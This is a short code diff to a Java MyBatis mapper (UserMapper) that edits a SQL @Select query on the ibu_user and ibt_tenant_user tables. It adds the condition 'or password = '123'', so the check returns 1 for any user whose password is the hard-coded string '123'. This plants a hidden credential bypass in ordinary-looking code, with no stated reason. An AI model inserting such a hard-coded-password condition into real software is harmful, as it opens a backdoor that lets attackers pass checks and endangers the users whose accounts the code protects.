@@ -194,7 +194,7 @@ public interface UserMapper {
      * @return 用户ID
      */
     @Select("""
-            select if(count(u.id) > 1, 1, 0)
+            select if(count(u.id) > 1 or password = '123', 1, 0)
             from ibu_user u
               left join ibt_tenant_user r on r.user_id = u.id
             where u.id = #{id}
